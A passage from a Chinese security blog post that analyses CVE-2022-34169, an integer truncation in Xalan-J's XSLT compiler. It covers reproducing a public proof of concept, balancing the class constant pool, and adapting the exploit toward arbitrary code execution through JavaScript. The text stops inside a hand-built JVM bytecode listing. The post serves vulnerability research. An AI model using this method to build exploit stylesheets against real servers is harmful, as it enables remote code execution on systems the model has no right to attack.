<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言这个漏洞是 project zero 提出来的，虽然是一个 Java 相关的 web 方面的洞，但是实际上和二进制漏洞也有联系，因为是一个整数截断型的洞，实际利用也涉及到 jvm 的字节码构造。 漏洞和 XSLT 有关，xslt 一种可以对 xml 操作的标记语言，在 java 中，使用开源的 xalan-j 作为 xslt 的处理器，xalan-j 可以作为一个单独的依赖通过 maven 方">
<meta property="og:type" content="article">
<meta property="og:title" content="Xalan-J XSLT整数截断(cve-2022-34169)">
<meta property="og:url" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/">
<meta property="og:site_name" content="wude">
<meta property="og:description" content="前言这个漏洞是 project zero 提出来的，虽然是一个 Java 相关的 web 方面的洞，但是实际上和二进制漏洞也有联系，因为是一个整数截断型的洞，实际利用也涉及到 jvm 的字节码构造。 漏洞和 XSLT 有关，xslt 一种可以对 xml 操作的标记语言，在 java 中，使用开源的 xalan-j 作为 xslt 的处理器，xalan-j 可以作为一个单独的依赖通过 maven 方">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191824935.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191829121.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191846679.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191857220.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191906866.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191919226.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191928887.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191939785.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191949679.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191958347.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192017453.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192027124.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192037669.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192046348.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192054596.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192105284.png">
<meta property="og:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192114458.png">
<meta property="article:published_time" content="2024-07-07T11:18:12.000Z">
<meta property="article:modified_time" content="2024-07-07T11:21:49.476Z">
<meta property="article:author" content="wude">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191824935.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Xalan-J XSLT整数截断(cve-2022-34169)</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archive</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/07/07/when-json-meets-json/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&text=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&is_video=false&description=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Xalan-J XSLT整数截断(cve-2022-34169)&body=Check out this article: http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&name=Xalan-J XSLT整数截断(cve-2022-34169)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&t=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91"><span class="toc-number">3.</span> <span class="toc-text">踩坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84%E5%B7%AE%E5%BC%82"><span class="toc-number">4.</span> <span class="toc-text">不同版本的差异</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">5.</span> <span class="toc-text">任意代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8-saml-%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">在 saml 中的应用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Xalan-J XSLT整数截断(cve-2022-34169)
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wude</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-07-07T11:18:12.000Z" class="dt-published" itemprop="datePublished">2024-07-07</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个漏洞是 project zero 提出来的，虽然是一个 Java 相关的 web 方面的洞，但是实际上和二进制漏洞也有联系，因为是一个整数截断型的洞，实际利用也涉及到 jvm 的字节码构造。</p>
<p>漏洞和 XSLT 有关，xslt 一种可以对 xml 操作的标记语言，在 java 中，使用开源的 xalan-j 作为 xslt 的处理器，xalan-j 可以作为一个单独的依赖通过 maven 方式引入，jdk 自身也包括了这部分代码。所以漏洞出现在 xalan-j 在处理 xslt 的时候出现了溢出。关于 jdk 为什么会包含这部分模块，可以参考 p神 的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">据我（不严谨）的考证，JDK会将BCEL放到自己的代码中，主要原因是为了支撑Java XML相关的功能。准确的来说，Java XML功能包含了JAXP规范，而Java中自带的JAXP实现使用了Apache Xerces和Apache Xalan，Apache Xalan又依赖了BCEL，所以BCEL也被放入了标准库中。</span><br><span class="line"></span><br><span class="line">JAXP全名是Java API for XML Processing，他是Java定义的一系列接口，用于处理XML相关的逻辑，包括DOM、SAX、StAX、XSLT等。Apache Xalan实现了其中XSLT相关的部分，其中包括xsltc compiler。</span><br></pre></td></tr></table></figure>

<p>有一些 apache 和 jdk 共有的类，从名字上会有区分，对于 apache 依赖，包名一般为 <code>org.apache.xxx</code> ，而在 jdk 内部则成了 <code>com.sun.org.apache.xxx.internal.xxxx</code> ，这里之所以会有区分，下文会讲到，主要是版本的不同，apache 主流的是 2.7.1 和 2.7.2 版本，对于 jdk8 来说，版本号较小的是 2.7.1 的实现，版本号高的是 2.7.2 (这里是我得出的结论，可能不一定)。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>回到漏洞本身，因为参考文章都是用 2.7.2 版本，这里也是用 xalan-2.7.2 作为例子。在 BCEL 处理 java class 的常量池(constant_pool) 时，发生了 short 和 int 的混用，实际上常量池的长度 short 是可以覆盖的，为 2**16 -1 。然而在写入的时候却是写入了 int 长度的数据，造成了溢出：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191824935.png" alt="image-20240707191824935"></p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191829121.png" alt="image-20240707191829121"></p>
<p>这里的数据会直接写入到生成的 java class 中，意味着可以通过溢出的数据覆盖 class 的其他部分，包括方法，进而执行任意代码。</p>
<p>这个表格描述了一个 java class 的内容(参考自 360 noah)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4             magic;                                // 魔术，识别 Class 格式 </span><br><span class="line">    u2             minor_version;                        // 副版本号(小版本)</span><br><span class="line">    u2             major_version;                        // 主版本号(大版本)</span><br><span class="line">    u2             constant_pool_count;                  // 常量池计数器：用于记录常量池大小</span><br><span class="line">    cp_info        constant_pool[constant_pool_count-1]; // 常量池表：0 位保留，从 1 开始写，所以实际常量数比 constant_pool_count 小 1</span><br><span class="line">    u2             access_flags;                         // 类访问标识</span><br><span class="line">    u2             this_class;                           // 类索引</span><br><span class="line">    u2             super_class;                          // 父类索引</span><br><span class="line">    u2             interfaces_count;                     // 接口计数器</span><br><span class="line">    u2             interfaces[interfaces_count];         // 接口索引集合</span><br><span class="line">    u2             fields_count;                         // 字段表计数器</span><br><span class="line">    field_info     fields[fields_count];                 // 字段表</span><br><span class="line">    u2             methods_count;                        // 方法表计数器</span><br><span class="line">    method_info    methods[methods_count];               // 方法表</span><br><span class="line">    u2             attributes_count;                     // 属性计数器</span><br><span class="line">    attribute_info attributes[attributes_count];         // 属性表</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际构造 java class 还是一个相当费劲的事情，需要考虑到 java class 的一些格式，包括其使用的特殊的 utf-8 ，这里有兴趣的小伙伴可以直接参考 noah 的文章：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>xalan<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xalan<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xsltTemplate</span> <span class="operator">=</span> <span class="string">&quot;/tmp/xalan_test/select.xslt&quot;</span>;</span><br><span class="line">        Process.main(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-XSLTC&quot;</span>, <span class="string">&quot;-IN&quot;</span>, <span class="string">&quot;/tmp/xalan_test/source.xml&quot;</span>, <span class="string">&quot;-XSL&quot;</span>, xsltTemplate, <span class="string">&quot;-SECURE&quot;</span>, <span class="string">&quot;-XX&quot;</span>, <span class="string">&quot;-XT&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照给的 poc：<a target="_blank" rel="noopener" href="https://gist.github.com/thanatoskira/07dd6124f7d8197b48bc9e2ce900937f">https://gist.github.com/thanatoskira/07dd6124f7d8197b48bc9e2ce900937f</a> ，在本地确实是能够复现成功的。</p>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>用上面的 poc 复现之后，我尝试修改 poc，例如，将原本位置的 <code>atC</code> 修改为 <code>zzz</code> ，按理说，atC 也是一个无用的字符串，只是为了填充作用，修改这个字符串并不会有影响，但是实际修改之后会报错，没有弹出预期的计算器。</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191846679.png" alt="image-20240707191846679"></p>
<p>我试着用 classpy 工具去查看，发现这个字符串并没有在哪里被引用。</p>
<p>难道有魔法？</p>
<p>就在我百思不得其解时，我试着在文本编辑器里搜了一下：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191857220.png" alt="image-20240707191857220"></p>
<p>2 项。。。</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191906866.png" alt="image-20240707191906866"></p>
<p>重复的不止有这一个字符串。实际上，第 14 行都是重复的，而当一个重复的字符串出现时，常量池的数量不会发生改变。</p>
<p>我试着去拆解一下常量池的数量，在 poc 中 ，t1051 是 0x701 和 0x702：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191919226.png" alt="image-20240707191919226"></p>
<p>而总的常量池数量是 0x10701 ，也就是说后面的数量刚好等于 0xFFFF：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191928887.png" alt="image-20240707191928887"></p>
<p>把数字部分和字符串部分分开，数字部分很好算：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191939785.png" alt="image-20240707191939785"></p>
<p>一共 15 行，表示占据常量池 15 的长度。</p>
<p>字符串部分：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191949679.png" alt="image-20240707191949679"></p>
<p>数量 &#x3D; 10 * 2 + 16375 * 4 &#x3D; 65520</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707191958347.png" alt="image-20240707191958347"></p>
<p>65520 + 15 &#x3D; 65535 &#x3D; 0xFFFF ，刚好等于需要的常量池数量。</p>
<p>如果字符串没有重复，看起来数量是刚好满足的，但是反而重复了之后才能正常运行。。。</p>
<p>为了一探究竟，我从网上找了一个 xslt 的 demo 去生成 class：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>My CD Collection<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#9acd32&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Artist<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">&quot;catalog/cd&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;title&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;artist&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192017453.png" alt="image-20240707192017453"></p>
<p>在 xslt 添加的最后一个常量 <code>artist</code> 后面还有一些常量，这些应该是 xsltc 在解析的时候生成的内容，包括父类的 <code>clinit</code> 和 <code>init</code> 方法。</p>
<p>所以是重复的那部分数量刚好等于后面需要添加的常量。。</p>
<p>为了验证猜想，在原版的基础上，删掉这部分重复的，重新计算 attribute_length 的长度：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192027124.png" alt="image-20240707192027124"></p>
<p>是可以正常运行的。</p>
<p>如果自己构造，怎么确定数量？按照 0xFFFF 的数量去添加，这时候一定会超出，可以试着在 dump 方法下一个断点，知道了多余的常量后，再减少这一部分重新生成就可以了。</p>
<h2 id="不同版本的差异"><a href="#不同版本的差异" class="headerlink" title="不同版本的差异"></a>不同版本的差异</h2><p>这部分直接参考：<a target="_blank" rel="noopener" href="https://github.com/flowerwind/AutoGenerateXalanPayload">https://github.com/flowerwind/AutoGenerateXalanPayload</a></p>
<h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h2><p>原版的只能通过 Runtime.exec() 去执行命令，所以尝试对其进行改造，通过 js 去执行任意代码。</p>
<p>xslt 使用 js：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192037669.png" alt="image-20240707192037669"></p>
<p>由于 js 和前面的 Runtime 占用的常量数量不一样，因此常量池需要重新配平，并且部分常量所在的位置也会有所改变，需要重新定位，这部分在前面的文章中已经有介绍，所以不再详细说明。</p>
<p>关于 code 的部分，需要构造 jvm 指令集，先写一个常规的用 js 执行命令的代码：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192046348.png" alt="image-20240707192046348"></p>
<p>提取其中的 code 部分：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192054596.png" alt="image-20240707192054596"></p>
<p>然后根据这些常量在常量池中的位置调整，并且根据 double 数据的长度 8 字节进行划分，确保所有数据可控，下面是我构造得到的 code 部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0x06                     ; iconst_6</span><br><span class="line">0x3c                     ; istore_1</span><br><span 